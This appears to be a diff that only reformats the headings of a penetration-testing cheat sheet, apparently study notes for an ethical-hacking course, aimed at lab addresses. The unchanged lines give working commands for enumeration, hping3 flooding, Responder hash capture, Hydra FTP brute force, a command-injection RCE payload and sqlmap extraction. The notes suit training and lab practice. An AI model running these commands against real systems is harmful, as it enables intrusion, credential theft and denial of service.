@@ -1,10 +1,10 @@
->>> Module 02 : Enumeration 
+### >>> Module 02 : Enumeration 
 ------------------------------------------------------
 ping www.moviescope.com –f –l 1500 -> Frame size
 tracert www.moviescope.com -> Determining hop count
 
 ------------------------------------------------------
->> Enumeration using Metasploit :
+### >> Enumeration using Metasploit :
 ------------------------------------------------------
 msfdb init
 service postgresql start
@@ -17,7 +17,7 @@ db_nmap -sS -A 10.10.10.16 -> To extract services of particular machine
 services -> to get all available services in a subnet
 
 ------------------------------------------------------
->> SMB Version Enumeration using MSF
+### >> SMB Version Enumeration using MSF
 ------------------------------------------------------
 use scanner/smb/smb_version
 set RHOSTS 10.10.10.8-16
@@ -26,7 +26,7 @@ run
 hosts -> now exact os_flavor information has been updated
 
 ------------------------------------------------------
->> Module 03 : Scanning Networks
+### >> Module 03 : Scanning Networks
 ------------------------------------------------------
 Port Scanning using Hping3:
 hping3 --scan 1-3000 -S 10.10.10.10
@@ -46,7 +46,7 @@ HPing flood
 hping3 10.10.10.10 --flood
 
 ------------------------------------------------------
->>> Module 04 : Enumeration
+### >>> Module 04 : Enumeration
 ------------------------------------------------------
 
 >> SNMP Enumeration
@@ -61,7 +61,7 @@ set RHOSTS and exploit
 
 snmp-check <IP address>
 ------------------------------------------------------
->> NetBIOS Enumeration (139) : 
+### >> NetBIOS Enumeration (139) : 
 ------------------------------------------------------
 nbtstat –A 10.10.10.16
 net use
@@ -70,7 +70,7 @@ net use \10.10.10.16\e ““/user:””
 NetBIOS Enumerator
 
 ------------------------------------------------------
->>Enum4Linux Wins Enumeration :
+### >>Enum4Linux Wins Enumeration :
 ------------------------------------------------------
 
 enum4linux -u martin -p apple -U 10.10.10.12 -> Users Enumeration
@@ -80,11 +80,11 @@ enum4linux -u martin -p apple -G 10.10.10.12 -> Groups Information
 enum4linux -u martin -p apple -S 10.10.10.12 -> Share Policy Information (SMB Shares Enumeration)
 
 ------------------------------------------------------
->>Active Directory LDAP Enumeration : ADExplorer
+### >>Active Directory LDAP Enumeration : ADExplorer
 ------------------------------------------------------
 
 ------------------------------------------------------
->>Module 05 : Vulnerability Analysis 
+### >>Module 05 : Vulnerability Analysis 
 ------------------------------------------------------
 nikto -h http://www.goodshopping.com -Tuning 1 
 Nessus runs on  https://localhost:8834Username: admin Password: password
@@ -99,7 +99,7 @@ Schedule tab > Turn of Enabled
 Hit launch from drop-down of save.
 
 ------------------------------------------------------
->>>>Module 06 : System Hacking
+### >>>>Module 06 : System Hacking
 ------------------------------------------------------
 >>NTLM Hash crack :
 responder -I eth0
@@ -124,7 +124,7 @@ Ophcrack.exe -> load -> PWDUMP File
 Tables -> Vista free -> select the table directory -> crack
 
 ------------------------------------------------------
->>Module 08 : Sniffing
+### >>Module 08 : Sniffing
 ------------------------------------------------------
 
 http.request.method == “POST” -> Wireshark filter for filtering HTTP POST request 
@@ -134,7 +134,7 @@ Remote Interface > Add > Host &  Port (2002)
 Username & password > Start
 
 ------------------------------------------------------
->>>Module 13 : Hacking Web Servers
+### >>>Module 13 : Hacking Web Servers
 ------------------------------------------------------
 FTP Bruteforce with Hydra
 hydra -L /root/Desktop/Wordlists/Usernames.txt -P /root/Desktop/Wordlists/Passwords.txt ftp://10.10.10.11
@@ -153,7 +153,7 @@ RCE
 ping 127.0.0.1 | hostname | net user
 
 ------------------------------------------------------
->>>>Module 15 : SQL Injection
+### >>>>Module 15 : SQL Injection
 ------------------------------------------------------
 SQLMAP Extract DBS
 sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie="xookies xxx" --dbs
